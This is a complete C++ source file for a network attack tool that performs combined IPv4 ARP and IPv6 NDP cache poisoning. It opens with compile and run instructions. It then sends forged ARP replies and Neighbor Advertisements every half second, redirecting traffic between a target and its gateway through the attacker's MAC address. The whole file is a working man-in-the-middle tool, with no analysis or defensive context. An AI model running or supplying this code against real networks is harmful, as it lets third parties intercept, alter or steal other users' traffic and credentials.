// Compile: g++ -o arp_ndp arp_ndp.cpp -lpthread
// Run: sudo ./arp_ndp <target_ipv4> <target_mac> <gateway_ipv4> <gateway_mac> <attacker_mac> <iface> <target_ipv6> <gateway_ipv6>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>

class ARPNDPCombo {
private:
    int arpSock, ndpSock;
    std::string iface, attackerMAC;
    std::atomic<bool> running{false};
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    ARPNDPCombo(const std::string& i, const std::string& amac)
        : iface(i), attackerMAC(amac) {
        arpSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        bind(arpSock, (struct sockaddr*)&sll, sizeof(sll));
        
        ndpSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IPV6));
        bind(ndpSock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(arpSock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Send IPv6 Neighbor Advertisement
    void sendNDP(const std::string& srcIPv6, const std::string& srcMAC,
                 const std::string& dstIPv6, const std::string& dstMAC) {
        uint8_t packet[86];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_IPV6);
        
        struct ip6_hdr* ip6 = (struct ip6_hdr*)(packet + 14);
        ip6->ip6_vfc = 0x60;
        ip6->ip6_plen = htons(32);
        ip6->ip6_nxt = IPPROTO_ICMPV6;
        ip6->ip6_hlim = 255;
        inet_pton(AF_INET6, srcIPv6.c_str(), &ip6->ip6_src);
        inet_pton(AF_INET6, dstIPv6.c_str(), &ip6->ip6_dst);
        
        struct nd_neighbor_advert* na = (struct nd_neighbor_advert*)(packet + 14 + 40);
        na->nd_na_type = ND_NEIGHBOR_ADVERT;
        na->nd_na_code = 0;
        na->nd_na_flags_reserved = htonl(0x60000000);  // Solicited+Override
        inet_pton(AF_INET6, srcIPv6.c_str(), &na->nd_na_target);
        
        // Option: Target Link-Layer Address
        uint8_t* opt = packet + 14 + 40 + sizeof(struct nd_neighbor_advert);
        opt[0] = 2;  // Target Link-Layer Address
        opt[1] = 1;  // Length in 8-byte units
        macToBytes(srcMAC, opt + 2);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(ndpSock, packet, 86, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void poisonLoop(const std::string& targetIPv4, const std::string& targetMAC,
                    const std::string& gatewayIPv4, const std::string& gatewayMAC,
                    const std::string& targetIPv6, const std::string& gatewayIPv6) {
        while (running.load()) {
            // IPv4 ARP poisoning
            sendARP(gatewayIPv4, attackerMAC, targetIPv4, targetMAC);
            sendARP(targetIPv4, attackerMAC, gatewayIPv4, gatewayMAC);
            
            // IPv6 NDP poisoning
            sendNDP(gatewayIPv6, attackerMAC, targetIPv6, targetMAC);
            sendNDP(targetIPv6, attackerMAC, gatewayIPv6, gatewayMAC);
            
            usleep(500000);
        }
    }
    
    void run(const std::string& targetIPv4, const std::string& targetMAC,
             const std::string& gatewayIPv4, const std::string& gatewayMAC,
             const std::string& targetIPv6, const std::string& gatewayIPv6) {
        std::cout << "[*] Combined IPv4 ARP + IPv6 NDP poisoning\n";
        std::cout << "[*] IPv4 target: " << targetIPv4 << "\n";
        std::cout << "[*] IPv6 target: " << targetIPv6 << "\n";
        
        running = true;
        poisonLoop(targetIPv4, targetMAC, gatewayIPv4, gatewayMAC,
                   targetIPv6, gatewayIPv6);
    }
    
    ~ARPNDPCombo() {
        close(arpSock);
        close(ndpSock);
    }
};

int main(int argc, char* argv[]) {
    if (argc != 9) {
        std::cerr << "Usage: " << argv[0] 
                  << " <t_ip4> <t_mac> <g_ip4> <g_mac> <a_mac> <iface> <t_ip6> <g_ip6>\n";
        return 1;
    }
    ARPNDPCombo combo(argv[6], argv[5]);
    combo.run(argv[1], argv[2], argv[3], argv[4], argv[7], argv[8]);
    return 0;
}
